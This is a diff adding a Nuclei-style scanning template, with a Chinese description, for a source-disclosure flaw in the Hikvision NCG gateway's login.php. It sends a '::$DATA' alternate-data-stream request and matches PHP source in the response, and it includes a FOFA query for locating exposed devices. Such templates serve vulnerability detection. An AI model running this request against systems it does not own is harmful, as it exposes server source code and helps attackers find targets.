@@ -1,0 +1,31 @@
+id: hikvision-ncg-login-dirlist
+
+info:
+  name: hikvision-ncg-login-dirlist
+  author: unknow
+  severity: high
+  description: 海康威视 NCG 联网网关 login.php 存在目录遍历漏漏洞。
+  tags: hikvision,dirlist
+  metadata:
+    fofa-qeury: body="data/login.php"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        GET /data/{{dirlist}} HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0
+
+    payloads:
+      dirlist:
+        - "login.php::$DATA"
+               
+    matchers:     
+      - type: dsl
+        name: dirlist
+        dsl:
+          - "status_code_1 == 200 && contains(body,'<?php') && contains(header,'text/plain')" 
+
+#遍历目录/data
